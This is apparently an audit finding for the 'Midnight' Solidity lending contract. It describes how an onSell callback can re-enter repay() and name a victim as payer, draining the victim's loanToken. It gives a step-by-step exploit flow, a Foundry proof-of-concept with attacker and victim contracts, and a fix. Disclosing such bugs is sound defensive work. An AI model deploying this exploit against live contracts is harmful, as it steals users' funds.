### Title
`onSell` callback re-enters `repay(callback=victim)` to drain victim's loanToken via unchecked payer designation - (`src/Midnight.sol`)

### Summary
`repay()` authorizes the caller to repay on behalf of `onBehalf` but imposes no authorization check on the `callback` parameter, which becomes the payer. A seller whose callback contract is authorized via `isAuthorized` can, from within the `onSell` callback (while the liquidation lock protects the seller from liquidation), call `repay(market, units, seller, callback=victim, data)` to designate an arbitrary victim as the payer, pulling victim's loanToken into Midnight to retire the seller's debt.

### Finding Description

**Root cause — missing payer authorization in `repay()`:** [1](#0-0) 

```
require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
...
address payer = callback != address(0) ? callback : msg.sender;   // payer = victim
...
IRepayCallback(callback).onRepay(id, market, units, onBehalf, data);   // called on victim
SafeTransferLib.safeTransferFrom(market.loanToken, payer, address(this), units); // pulls from victim
```

The only gate is that `msg.sender` must be authorized to act on behalf of `onBehalf`. There is no check that `callback` (the payer) has authorized `msg.sender` to use it as a payer.

**Exploit flow:**

1. Seller (maker) creates a sell offer with `offer.callback = maliciousContract`.
2. Seller calls `setIsAuthorized(maliciousContract, true, seller)` — a normal precondition for any callback contract that needs to act on the seller's behalf (e.g., to call `supplyCollateral`).
3. Taker calls `take(offer, ...)`.
4. Inside `take()`, the liquidation lock is set for the seller: [2](#0-1) 
5. After the buyer-side token pull, `onSell` is invoked on `maliciousContract`: [3](#0-2) 
6. Inside `onSell`, `maliciousContract` calls `repay(market, units, seller, callback=victim, data)`.
   - `msg.sender` = `maliciousContract`; `isAuthorized[seller][maliciousContract]` = true → authorization check passes.
   - `payer` = `victim`.
   - `IRepayCallback(victim).onRepay(...)` is called; if victim returns `CALLBACK_SUCCESS`, execution continues.
   - `safeTransferFrom(loanToken, victim, midnight, units)` pulls `units` loanToken from victim.
7. Seller's debt is reduced. The post-callback health check at line 476 passes because the debt was repaid: [4](#0-3) 

**Why existing checks fail:**

- The `repay` authorization check (`isAuthorized[onBehalf][msg.sender]`) only verifies the right to repay on behalf of the seller; it says nothing about who may be designated as payer.
- The liquidation lock prevents the seller from being liquidated during the callback window, but does not restrict what the callback may do to third parties.
- The Certora spec `OnlyExplicitPayerCanLoseTokens.spec` explicitly models `onSell` with `HAVOC_ALL` and states "onSell cannot authorize a payer," but this assumption is incorrect — `onSell` can re-enter `repay` with an arbitrary `callback`: [5](#0-4) 
  The spec sets `repayCallbackAllowed = false` for `take`, so if the formal tool modeled the re-entrant `repay` call it would flag a violation, but the `HAVOC_ALL` abstraction for `onSell` prevents it from doing so. [6](#0-5) 

### Impact Explanation

Victim loses loanToken equal to `units` (the repaid amount). The seller's debt is retired at the victim's expense. The seller retains any collateral and is protected from liquidation throughout the window. This directly violates the invariant that callbacks, ERC20 transfers, and reentrancy cannot corrupt partial state and that only explicit payers can lose tokens.

### Likelihood Explanation

**Preconditions:**
1. Seller authorizes their callback contract — standard practice for any callback that calls `supplyCollateral` or similar on the seller's behalf (seen in existing tests).
2. Victim contract implements `IRepayCallback.onRepay` returning `CALLBACK_SUCCESS` without checking `onBehalf` — realistic for any Midnight-integrated contract that uses repay callbacks for its own operations and holds a blanket approval.
3. Victim has approved Midnight to spend loanToken and holds a loanToken balance — true for any active repay-callback contract or aggregator.

The attack is repeatable as long as the victim contract remains deployed and approved. The seller can craft the offer and callback contract entirely off-chain before deployment.

### Recommendation

Add an authorization check in `repay()` requiring that the `callback` (payer) has authorized the caller:

```solidity
require(
    callback == address(0) || callback == msg.sender || isAuthorized[callback][msg.sender],
    UnauthorizedPayer()
);
```

This mirrors the pattern used for `onBehalf` and ensures that only a payer who has explicitly consented can have tokens pulled on their behalf.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.34;

// Victim: implements IRepayCallback, has approved Midnight, holds loanToken
contract VictimRepayCallback is IRepayCallback {
    address public immutable midnight;
    constructor(address _midnight) { midnight = _midnight; }
    // Does NOT check onBehalf — common pattern for generic callback contracts
    function onRepay(bytes32, Market memory, uint256, address, bytes memory)
        external returns (bytes32) { return CALLBACK_SUCCESS; }
}

// Attacker's sell callback
contract MaliciousSellCallback is ISellCallback {
    address public immutable midnight;
    address public victim;
    constructor(address _midnight, address _victim) {
        midnight = _midnight; victim = _victim;
    }
    function onSell(bytes32, Market memory market, uint256, uint256 units,
        uint256, address seller, address, bytes memory)
        external returns (bytes32)
    {
        // Re-enter repay: seller's debt is repaid using victim's tokens
        IMidnight(midnight).repay(market, units, seller, victim, "");
        return CALLBACK_SUCCESS;
    }
}

function testVictimPaysSellerDebt() public {
    // Setup: victim has loanToken and has approved Midnight
    deal(loanToken, address(victim), units);
    vm.prank(address(victim));
    ERC20(loanToken).approve(address(midnight), units);

    // Seller authorizes malicious callback (normal precondition)
    vm.prank(seller);
    midnight.setIsAuthorized(address(maliciousCallback), true, seller);

    uint256 victimBalanceBefore = ERC20(loanToken).balanceOf(address(victim));
    uint256 sellerDebtBefore = midnight.debtOf(id, seller);

    // Taker takes the sell offer; onSell triggers repay(callback=victim)
    vm.prank(taker);
    midnight.take(sellOffer, hex"", units, taker, taker, address(0), "");

    // Assertions
    assertEq(midnight.debtOf(id, seller), sellerDebtBefore - units, "seller debt reduced");
    assertEq(ERC20(loanToken).balanceOf(address(victim)), victimBalanceBefore - units, "victim lost tokens");
}
```

**Expected assertions:** seller's debt decreases by `units`; victim's loanToken balance decreases by `units`; seller was never liquidatable during the window.

### Citations

**File:** src/Midnight.sol (L444-444)
```text
        bool wasLocked = UtilsLib.tExchange(LIQUIDATION_LOCK_SLOT, id, seller, true);
```

**File:** src/Midnight.sol (L458-474)
```text
        if (sellerCallback != address(0)) {
            bytes memory sellerCallbackData = offer.buy ? takerCallbackData : offer.callbackData;
            require(
                ISellCallback(sellerCallback)
                    .onSell(
                        id,
                        offer.market,
                        sellerAssets,
                        units,
                        sellerPendingFeeDecrease,
                        seller,
                        receiver,
                        sellerCallbackData
                    ) == CALLBACK_SUCCESS,
                WrongSellCallbackReturnValue()
            );
        }
```

**File:** src/Midnight.sol (L475-476)
```text
        if (!wasLocked) UtilsLib.tExchange(LIQUIDATION_LOCK_SLOT, id, seller, false);
        require(liquidationLocked(id, seller) || isHealthy(offer.market, id, seller), SellerIsLiquidatable());
```

**File:** src/Midnight.sol (L502-521)
```text
    function repay(Market memory market, uint256 units, address onBehalf, address callback, bytes calldata data)
        external
    {
        require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
        bytes32 id = touchMarket(market);

        position[id][onBehalf].debt -= UtilsLib.toUint128(units);
        marketState[id].withdrawable += UtilsLib.toUint128(units);

        address payer = callback != address(0) ? callback : msg.sender;
        emit EventsLib.Repay(msg.sender, id, units, onBehalf, payer);

        if (callback != address(0)) {
            require(
                IRepayCallback(callback).onRepay(id, market, units, onBehalf, data) == CALLBACK_SUCCESS,
                WrongRepayCallbackReturnValue()
            );
        }
        SafeTransferLib.safeTransferFrom(market.loanToken, payer, address(this), units);
    }
```

**File:** certora/specs/OnlyExplicitPayerCanLoseTokens.spec (L11-18)
```text
    // Callbacks can modify the whole state arbitrarily, and can only modify the ghost variables to allow
    // themselves as payer. Callbacks are checked to only be called by their corresponding function,
    // eg onLiquidate is only called by liquidate. onRatify and onSell cannot authorize a payer, so we
    // model them with a plain HAVOC_ALL.
    function _.onBuy(bytes32, Midnight.Market, uint256, uint256, uint256, address, bytes) external => onCallBackSummary(calledContract, buyCallbackAllowed) expect(bytes32);
    function _.onLiquidate(address, bytes32, Midnight.Market, uint256, uint256, uint256, address, address, bytes, uint256) external => onCallBackSummary(calledContract, liquidateCallbackAllowed) expect(bytes32);
    function _.onRepay(bytes32, Midnight.Market, uint256, address, bytes) external => onCallBackSummary(calledContract, repayCallbackAllowed) expect(bytes32);
    function _.onFlashLoan(address, address[], uint256[], bytes) external => onCallBackSummary(calledContract, flashLoanCallbackAllowed) expect(bytes32);
```

**File:** certora/specs/OnlyExplicitPayerCanLoseTokens.spec (L106-114)
```text
    buyCallbackAllowed = true;
    liquidateCallbackAllowed = false;
    repayCallbackAllowed = false;
    flashLoanCallbackAllowed = false;
    badPullSeen = false;

    take(e, offer, ratifierData, units, taker, receiverIfTakerIsSeller, takerCallback, takerCallbackData);

    assert !badPullSeen;
```
